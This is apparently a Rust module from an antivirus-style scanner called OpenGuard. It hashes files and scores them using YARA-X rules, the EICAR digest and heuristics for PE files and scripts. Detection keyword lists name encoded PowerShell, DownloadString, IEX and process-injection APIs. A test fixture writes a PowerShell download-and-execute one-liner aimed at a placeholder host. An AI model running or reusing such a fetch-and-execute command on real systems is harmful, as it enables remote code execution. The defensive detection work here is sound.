use crate::capabilities::inspect_capabilities;
use openguard_domain::{ScanFinding, ScanVerdict, SignatureStatus};
use sha2::{Digest, Sha256};
use std::{
    collections::{HashMap, HashSet},
    env,
    fs::File,
    io::Read,
    path::Path,
    sync::atomic::{AtomicBool, Ordering},
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use thiserror::Error;
use yara_x::{Compiler, MetaValue, Rules, Scanner};

const BUFFER_SIZE: usize = 1024 * 1024;
const DEFAULT_MAXIMUM_BYTES: u64 = 8 * 1024 * 1024 * 1024;
const CONTENT_INSPECTION_BYTES: usize = 16 * 1024 * 1024;
const YARA_TIMEOUT: Duration = Duration::from_secs(10);
const COMMUNITY_RULES: &str = include_str!("../../../security-content/rules/community.yar");
const EXECUTABLE_EXTENSIONS: &[&str] = &["exe", "dll", "sys", "scr", "com", "cpl", "msi"];
const SCRIPT_EXTENSIONS: &[&str] = &[
    "ps1", "psm1", "bat", "cmd", "js", "jse", "vbs", "vbe", "hta",
];
const LURE_EXTENSIONS: &[&str] = &[
    "doc", "docx", "gif", "jpg", "jpeg", "pdf", "png", "txt", "xls", "xlsx",
];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HashOutcome {
    pub sha256: String,
    pub size_bytes: u64,
}

#[derive(Debug, Error)]
pub enum ScanError {
    #[error("file exceeds the configured {maximum} byte limit")]
    TooLarge { maximum: u64 },
    #[error("scan cancelled")]
    Cancelled,
    #[error("target is not a regular file: {0}")]
    NotAFile(String),
    #[error("YARA-X rule compilation failed: {0}")]
    RuleCompilation(String),
    #[error("YARA-X scan failed: {0}")]
    RuleScan(String),
    #[error("file I/O error: {0}")]
    Io(#[from] std::io::Error),
}

/// Immutable detection configuration. Each scan creates a short-lived YARA-X
/// scanner, making this type safe to share between service worker threads.
pub struct FileScanner {
    rules: Rules,
    known_hashes: HashMap<String, String>,
    maximum_bytes: u64,
}

impl FileScanner {
    /// Builds the production scanner with the repository's reviewed community
    /// rules and the standardized EICAR test-file digest.
    ///
    /// # Errors
    ///
    /// Returns an error when bundled YARA-X content cannot compile.
    pub fn new() -> Result<Self, ScanError> {
        Self::with_rule_sources(&[COMMUNITY_RULES])
    }

    /// Builds a scanner from explicit rule sources. This is primarily useful
    /// for signed-content activation and deterministic tests.
    ///
    /// # Errors
    ///
    /// Returns an error containing YARA-X diagnostics for malformed content.
    pub fn with_rule_sources(sources: &[&str]) -> Result<Self, ScanError> {
        let mut compiler = Compiler::new();
        for source in sources {
            compiler
                .add_source(*source)
                .map_err(|error| ScanError::RuleCompilation(error.to_string()))?;
        }
        let known_hashes = HashMap::from([(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".into(),
            "EICAR-Test-File".into(),
        )]);
        Ok(Self {
            rules: compiler.build(),
            known_hashes,
            maximum_bytes: DEFAULT_MAXIMUM_BYTES,
        })
    }

    #[must_use]
    pub const fn maximum_bytes(&self) -> u64 {
        self.maximum_bytes
    }

    #[must_use]
    pub fn with_maximum_bytes(mut self, maximum_bytes: u64) -> Self {
        self.maximum_bytes = maximum_bytes;
        self
    }

    /// Scans one regular file with bounded memory, cancellation, SHA-256,
    /// YARA-X, PE/script heuristics and explainable scoring.
    ///
    /// Platform signals such as AMSI and Authenticode are intentionally added
    /// by the Windows boundary so this portable crate remains independently
    /// testable.
    ///
    /// # Errors
    ///
    /// Returns an error for invalid targets, I/O failures, cancellation,
    /// oversized files or YARA-X execution failures.
    #[allow(clippy::too_many_lines)]
    pub fn scan_file(
        &self,
        path: impl AsRef<Path>,
        cancelled: &AtomicBool,
    ) -> Result<ScanFinding, ScanError> {
        let path = path.as_ref();
        let metadata = path.metadata()?;
        if !metadata.is_file() {
            return Err(ScanError::NotAFile(path.display().to_string()));
        }
        if metadata.len() > self.maximum_bytes {
            return Err(ScanError::TooLarge {
                maximum: self.maximum_bytes,
            });
        }

        let (hash, content) = read_hash_and_content(path, self.maximum_bytes, cancelled)?;
        let extension = extension(path);
        let mut score = 0_u16;
        let mut reasons = Vec::new();
        let mut yara_matches = Vec::new();
        let mut capabilities = Vec::new();

        if let Some(name) = self.known_hashes.get(&hash.sha256) {
            score = 100;
            reasons.push(format!("Known signature match: {name}"));
        }
        if contains_bytes(&content, &eicar_bytes()) {
            score = 100;
            reasons.push("EICAR antivirus test signature detected".into());
        }

        let mut yara_scanner = Scanner::new(&self.rules);
        yara_scanner.set_timeout(YARA_TIMEOUT);
        let yara_results = yara_scanner
            .scan(&content)
            .map_err(|error| ScanError::RuleScan(error.to_string()))?;
        for rule in yara_results.matching_rules() {
            let identifier = rule.identifier().to_owned();
            let mut description = "Local content rule matched".to_owned();
            let mut severity = "suspicious".to_owned();
            for (key, value) in rule.metadata() {
                match (key, value) {
                    ("description", MetaValue::String(value)) => value.clone_into(&mut description),
                    ("severity", MetaValue::String(value)) => severity = value.to_ascii_lowercase(),
                    _ => {}
                }
            }
            score = match severity.as_str() {
                "malicious" | "critical" => 100,
                "high" | "suspicious" => score.max(65),
                "medium" | "low" => score.max(25),
                _ => score,
            };
            reasons.push(format!("YARA-X {identifier}: {description}"));
            yara_matches.push(identifier);
        }

        if let Some(double_extension) = deceptive_double_extension(path) {
            score = score.saturating_add(25);
            reasons.push(format!(
                "Executable uses a deceptive double extension ({double_extension})"
            ));
        }

        let signature = if EXECUTABLE_EXTENSIONS.contains(&extension.as_str()) {
            score = score.saturating_add(8);
            reasons.push("Authenticode trust has not yet been evaluated".into());
            let (location_score, location_reason) = location_risk(path);
            score = score.saturating_add(location_score);
            if let Some(reason) = location_reason {
                reasons.push(reason);
            }
            SignatureStatus::Unknown
        } else {
            SignatureStatus::NotApplicable
        };

        let is_pe = content.starts_with(b"MZ");
        let is_script =
            SCRIPT_EXTENSIONS.contains(&extension.as_str()) || looks_like_script(&content);
        if is_pe {
            let (pe_score, pe_reasons) = inspect_pe(&content, metadata.len());
            score = score.saturating_add(pe_score);
            reasons.extend(pe_reasons);
        }
        if is_pe || is_script {
            let capability_assessment = inspect_capabilities(&content);
            score = score.saturating_add(capability_assessment.score);
            for capability in &capability_assessment.capabilities {
                reasons.push(format!(
                    "Capability {} ({}, confidence {}%)",
                    capability.category, capability.mitre_technique, capability.confidence
                ));
            }
            capabilities = capability_assessment.capabilities;
        }

        if is_script {
            let (script_score, script_reasons) = inspect_script(&content);
            score = score.saturating_add(script_score);
            reasons.extend(script_reasons);
        }

        let score = u8::try_from(score.min(100)).unwrap_or(100);
        if reasons.is_empty() {
            reasons.push("No configured local detection signal matched".into());
        }
        deduplicate(&mut reasons);
        Ok(ScanFinding {
            path: path
                .canonicalize()
                .unwrap_or_else(|_| path.to_path_buf())
                .display()
                .to_string(),
            verdict: verdict(score),
            score,
            reasons,
            sha256: hash.sha256,
            size_bytes: hash.size_bytes,
            signature,
            amsi_result: "not_scanned".into(),
            yara_status: "active".into(),
            yara_matches,
            capabilities,
            scanned_at: timestamp(),
        })
    }
}

/// Streams a file through SHA-256 with a hard size limit and cancellation.
///
/// # Errors
///
/// Returns a too-large error before reading oversized content, a cancelled
/// error when requested, or an I/O error for file access failures.
pub fn hash_file(
    path: impl AsRef<Path>,
    maximum_bytes: u64,
    cancelled: &AtomicBool,
) -> Result<HashOutcome, ScanError> {
    read_hash_and_content(path.as_ref(), maximum_bytes, cancelled).map(|(hash, _)| hash)
}

fn read_hash_and_content(
    path: &Path,
    maximum_bytes: u64,
    cancelled: &AtomicBool,
) -> Result<(HashOutcome, Vec<u8>), ScanError> {
    let mut file = File::open(path)?;
    let size_bytes = file.metadata()?.len();
    if size_bytes > maximum_bytes {
        return Err(ScanError::TooLarge {
            maximum: maximum_bytes,
        });
    }
    let capacity = usize::try_from(size_bytes.min(CONTENT_INSPECTION_BYTES as u64)).unwrap_or(0);
    let mut content = Vec::with_capacity(capacity);
    let mut digest = Sha256::new();
    let mut buffer = vec![0_u8; BUFFER_SIZE];
    loop {
        if cancelled.load(Ordering::Relaxed) {
            return Err(ScanError::Cancelled);
        }
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        digest.update(&buffer[..read]);
        let remaining = CONTENT_INSPECTION_BYTES.saturating_sub(content.len());
        content.extend_from_slice(&buffer[..read.min(remaining)]);
    }
    Ok((
        HashOutcome {
            sha256: hex::encode(digest.finalize()),
            size_bytes,
        },
        content,
    ))
}

fn eicar_bytes() -> Vec<u8> {
    [
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$".as_slice(),
        b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*".as_slice(),
    ]
    .concat()
}

fn contains_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty()
        && haystack
            .windows(needle.len())
            .any(|window| window == needle)
}

fn extension(path: &Path) -> String {
    path.extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase()
}

fn deceptive_double_extension(path: &Path) -> Option<String> {
    let name = path.file_name()?.to_str()?.to_ascii_lowercase();
    let parts: Vec<&str> = name.split('.').collect();
    if parts.len() < 3 {
        return None;
    }
    let lure = parts[parts.len() - 2];
    let executable = parts[parts.len() - 1];
    (LURE_EXTENSIONS.contains(&lure) && EXECUTABLE_EXTENSIONS.contains(&executable))
        .then(|| format!(".{lure}.{executable}"))
}

fn location_risk(path: &Path) -> (u16, Option<String>) {
    let lowered = path
        .canonicalize()
        .unwrap_or_else(|_| path.to_path_buf())
        .display()
        .to_string()
        .replace('/', "\\")
        .to_ascii_lowercase();
    for variable in ["TEMP", "TMP"] {
        if let Ok(value) = env::var(variable) {
            let root = value
                .replace('/', "\\")
                .trim_end_matches('\\')
                .to_ascii_lowercase();
            if !root.is_empty() && (lowered == root || lowered.starts_with(&format!("{root}\\"))) {
                return (
                    30,
                    Some("Executable is stored in a temporary directory".into()),
                );
            }
        }
    }
    if let Ok(value) = env::var("USERPROFILE") {
        let downloads = format!(
            "{}\\downloads\\",
            value
                .replace('/', "\\")
                .trim_end_matches('\\')
                .to_ascii_lowercase()
        );
        if lowered.starts_with(&downloads) {
            return (18, Some("Executable is stored in Downloads".into()));
        }
    }
    (0, None)
}

fn inspect_script(content: &[u8]) -> (u16, Vec<String>) {
    let text = String::from_utf8_lossy(content).to_ascii_lowercase();
    let mut score = 0_u16;
    let mut reasons = Vec::new();
    let signals = [
        (
            ["-enc", "-encodedcommand"].as_slice(),
            28,
            "Encoded command execution",
        ),
        (
            ["frombase64string("].as_slice(),
            18,
            "Base64 payload decoding",
        ),
        (
            ["invoke-expression", "iex ", "iex("].as_slice(),
            20,
            "Dynamic expression execution",
        ),
        (
            ["downloadstring("].as_slice(),
            28,
            "Downloads executable script content",
        ),
        (
            ["virtualalloc", "writeprocessmemory", "createremotethread"].as_slice(),
            35,
            "Process injection API reference",
        ),
        (
            ["mshta", "mshta.exe"].as_slice(),
            16,
            "HTML application host execution",
        ),
    ];
    for (needles, weight, reason) in signals {
        if needles.iter().any(|needle| text.contains(needle)) {
            score = score.saturating_add(weight);
            reasons.push(reason.into());
        }
    }
    if text.contains("regsvr32") && (text.contains("/i:") || text.contains("/u")) {
        score = score.saturating_add(18);
        reasons.push("Regsvr32 scriptlet-style execution".into());
    }
    if text.contains("rundll32") && (text.contains("javascript:") || text.contains("http")) {
        score = score.saturating_add(22);
        reasons.push("Rundll32 remote/script execution".into());
    }
    (score.min(80), reasons)
}

fn looks_like_script(content: &[u8]) -> bool {
    let prefix = &content[..content.len().min(256)];
    let prefix = String::from_utf8_lossy(prefix);
    let prefix = prefix.trim_start().to_ascii_lowercase();
    prefix.starts_with("#!") || prefix.starts_with("<script") || prefix.starts_with("<?xml")
}

fn inspect_pe(content: &[u8], file_size: u64) -> (u16, Vec<String>) {
    if content.len() < 64 {
        return (25, vec!["Truncated DOS/PE header".into()]);
    }
    let pe_offset = usize::try_from(u32::from_le_bytes([
        content[0x3c],
        content[0x3d],
        content[0x3e],
        content[0x3f],
    ]))
    .unwrap_or(usize::MAX);
    if pe_offset < 64
        || pe_offset.saturating_add(24) > content.len()
        || content.get(pe_offset..pe_offset.saturating_add(4)) != Some(b"PE\0\0".as_slice())
    {
        return (25, vec!["Malformed PE header".into()]);
    }
    let section_count = u16::from_le_bytes([content[pe_offset + 6], content[pe_offset + 7]]);
    let timestamp = u32::from_le_bytes([
        content[pe_offset + 8],
        content[pe_offset + 9],
        content[pe_offset + 10],
        content[pe_offset + 11],
    ]);
    let mut score = 0_u16;
    let mut reasons = Vec::new();
    if section_count == 0 || section_count > 32 {
        score += 20;
        reasons.push(format!("Unusual PE section count ({section_count})"));
    }
    if timestamp == 0 {
        score += 5;
        reasons.push("PE build timestamp is zero".into());
    }
    let sample = &content[..content.len().min(2 * 1024 * 1024)];
    let entropy = entropy(sample);
    if sample.len() >= 4096 && entropy >= 7.65 {
        score += 18;
        reasons.push(format!(
            "High file entropy may indicate packing or encryption ({entropy:.2})"
        ));
    }
    if file_size < 512 {
        score += 10;
        reasons.push("PE file is unusually small".into());
    }
    (score, reasons)
}

fn entropy(content: &[u8]) -> f64 {
    if content.is_empty() {
        return 0.0;
    }
    let mut counts = [0_u32; 256];
    for byte in content {
        counts[usize::from(*byte)] += 1;
    }
    let length = f64::from(u32::try_from(content.len()).unwrap_or(u32::MAX));
    -counts
        .into_iter()
        .filter(|count| *count > 0)
        .map(|count| {
            let probability = f64::from(count) / length;
            probability * probability.log2()
        })
        .sum::<f64>()
}

const fn verdict(score: u8) -> ScanVerdict {
    match score {
        85..=u8::MAX => ScanVerdict::Malicious,
        45..=84 => ScanVerdict::Suspicious,
        15..=44 => ScanVerdict::LowRisk,
        _ => ScanVerdict::Clean,
    }
}

fn deduplicate(values: &mut Vec<String>) {
    let mut seen = HashSet::new();
    values.retain(|value| seen.insert(value.clone()));
}

fn timestamp() -> String {
    let seconds = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |duration| duration.as_secs());
    format!("unix:{seconds}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::{fs, sync::atomic::AtomicBool};
    use tempfile::TempDir;

    fn scanner() -> FileScanner {
        FileScanner::new().expect("scanner")
    }

    #[test]
    fn streams_sha256_without_loading_the_whole_file() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("sample.bin");
        fs::write(&file, b"OpenGuard").unwrap();
        let result = hash_file(&file, 1024, &AtomicBool::new(false)).unwrap();
        assert_eq!(result.size_bytes, 9);
        assert_eq!(
            result.sha256,
            "581a1fd033a73d3ab8c22045bf48c36c32179c4ddc156f9c609e7e314b537a0b"
        );
    }

    #[test]
    fn checks_cancellation_before_reading_content() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("sample.bin");
        fs::write(&file, b"content").unwrap();
        let error = hash_file(&file, 1024, &AtomicBool::new(true)).unwrap_err();
        assert!(matches!(error, ScanError::Cancelled));
    }

    #[test]
    fn clean_content_has_an_explainable_clean_verdict() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("notes.txt");
        fs::write(&file, b"This is an ordinary OpenGuard test note.").unwrap();
        let finding = scanner().scan_file(&file, &AtomicBool::new(false)).unwrap();
        assert_eq!(finding.verdict, ScanVerdict::Clean);
        assert_eq!(finding.score, 0);
        assert_eq!(finding.yara_status, "active");
    }

    #[test]
    fn standardized_eicar_digest_is_in_the_known_signature_set() {
        // Do not write the complete standardized test signature to disk here:
        // an installed real-time provider is expected to intercept that write.
        let scanner = scanner();
        let digest = hex::encode(Sha256::digest(eicar_bytes()));
        assert_eq!(
            scanner.known_hashes.get(&digest).map(String::as_str),
            Some("EICAR-Test-File")
        );
    }

    #[test]
    fn community_yara_marker_is_malicious() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("marker.txt");
        fs::write(&file, b"OPENGUARD_SIGNED_CONTENT_TEST_MARKER_2026").unwrap();
        let finding = scanner().scan_file(&file, &AtomicBool::new(false)).unwrap();
        assert_eq!(finding.verdict, ScanVerdict::Malicious);
        assert_eq!(finding.yara_matches.len(), 1);
    }

    #[test]
    fn combined_script_signals_are_suspicious() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("payload.ps1");
        fs::write(
            &file,
            b"powershell -EncodedCommand AAAA; IEX(New-Object Net.WebClient).DownloadString('https://example.invalid')",
        )
        .unwrap();
        let finding = scanner().scan_file(&file, &AtomicBool::new(false)).unwrap();
        assert!(matches!(
            finding.verdict,
            ScanVerdict::Suspicious | ScanVerdict::Malicious
        ));
        assert!(finding.score >= 45);
    }

    #[test]
    fn deceptive_double_extension_is_scored() {
        let directory = TempDir::new().unwrap();
        let file = directory.path().join("invoice.pdf.exe");
        fs::write(&file, b"not a PE").unwrap();
        let finding = scanner().scan_file(&file, &AtomicBool::new(false)).unwrap();
        assert_eq!(finding.verdict, ScanVerdict::LowRisk);
        assert!(finding.score >= 25);
    }
}
